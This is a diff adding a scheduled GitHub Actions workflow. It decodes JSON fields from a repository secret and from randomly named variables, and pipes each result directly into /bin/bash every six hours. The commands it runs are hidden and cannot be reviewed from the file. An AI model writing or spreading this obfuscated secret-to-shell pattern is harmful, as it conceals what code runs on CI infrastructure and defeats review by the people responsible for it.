@@ -1,0 +1,29 @@
+name: chuanzhangqinxian
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chuanzhangqinxian
+        env:
+          kp6: ${{ secrets.kp6 }}
+        run: |
+          echo $kp6 | jq -r .bvdlv29465 | /bin/bash
+          echo $vaju9146 | jq -r .votxq85641 | /bin/bash
+          echo $jytsv2148 | jq -r .gx18 | /bin/bash
+          echo $drk2 | jq -r .yrcl9 | /bin/bash
+          echo $uynn9928 | jq -r .ffo3965 | /bin/bash
+          echo $tnnbl22767 | jq -r .ch87120 | /bin/bash
+          echo $zv637 | jq -r .xt4938 | /bin/bash
+          echo $l72332 | jq -r .tn7 | /bin/bash
+          echo $vbenq430 | jq -r .iyhlt581 | /bin/bash
+          echo $ih676 | jq -r .w423 | /bin/bash
+          echo $jaic2 | jq -r .bsnv83619 | /bin/bash
+          echo $uue0 | jq -r .iefbm39589 | /bin/bash
+
